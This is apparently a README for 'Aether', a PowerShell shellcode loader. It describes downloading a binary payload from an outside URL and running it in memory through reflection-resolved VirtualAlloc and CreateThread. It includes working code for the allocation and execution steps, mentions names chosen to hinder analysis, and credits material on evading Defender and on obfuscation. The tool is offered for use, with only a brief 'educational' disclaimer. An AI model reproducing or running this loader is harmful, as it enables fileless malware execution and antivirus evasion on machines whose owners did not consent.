# Aether

Aether is a PowerShell script that demonstrates dynamic API resolution and in-memory payload execution using .NET reflection. It dynamically finds Windows API functions, builds delegates at runtime, downloads a payload, allocates executable memory, and runs the payload in a new thread without ever touching disk.

## What It Does

- Locates Windows API functions like `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` by searching loaded .NET assemblies instead of static imports.
- Creates delegates on the fly to match API function signatures using reflection emit.
- Downloads a binary payload from a URL, allocates RWX memory, copies the payload, and executes it in a new thread.
- Uses funny variable and function names like `potatoes` and `apples` to make code analysis a bit more entertaining (and less obvious).

## Usage

**Warning:** This script executes arbitrary code in memory and will likely trigger AV/EDR. Only use it in a safe lab environment or with explicit permission.

1. Change the `$url` variable to your payload's direct download link.
2. Run the script in PowerShell. Admin rights may be needed for some payloads.

```powershell
$url = "https://your-server.com/payload.bin"
# ...rest of the script...
```

## How It Works

- **API Lookup:** The `potatoes` function finds the address of Windows API functions using .NET internals.
- **Delegate Generation:** The `apples` function creates the right .NET delegate type at runtime for the API function pointers.
- **Payload Download:** Downloads your binary payload and stores it in a byte array.
- **Memory Allocation:** Uses `VirtualAlloc` to reserve executable memory.
- **Payload Execution:** Copies the payload into memory, spawns a new thread with `CreateThread`, and waits for it to finish.

## Example

```powershell
$virtualAllocPtr = potatoes kernel32.dll VirtualAlloc
$virtualAllocDelegateType = apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$virtualAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAllocPtr, $virtualAllocDelegateType)
$mem = $virtualAllocDelegate.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)

$createThreadPtr = potatoes kernel32.dll CreateThread
$createThreadDelegateType = apples @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$createThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($createThreadPtr, $createThreadDelegateType)
$thread = $createThreadDelegate.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

$waitForSingleObjectPtr = potatoes kernel32.dll WaitForSingleObject
$waitForSingleObjectDelegateType = apples @([IntPtr], [Int32]) ([Int32])
$waitForSingleObjectDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($waitForSingleObjectPtr, $waitForSingleObjectDelegateType)
$waitResult = $waitForSingleObjectDelegate.Invoke($thread, 0xFFFFFFFF)
```

## Credits

- Big thanks to [this excellent article by @luisgerardomoret](https://medium.com/@luisgerardomoret_69654/making-a-powershell-shellcode-downloader-that-evades-defender-without-amsi-bypass-d2cf13f18409) for the original inspiration and technical breakdown.
- For PowerShell obfuscation and more, check out [@KingKDot/PowerCrypt](https://github.com/KingKDot/PowerCrypt).

## License

MIT License

---

**Disclaimer:**  
This code is for educational and research purposes only. Don’t run it anywhere you don’t have permission. The author is not responsible for misuse.
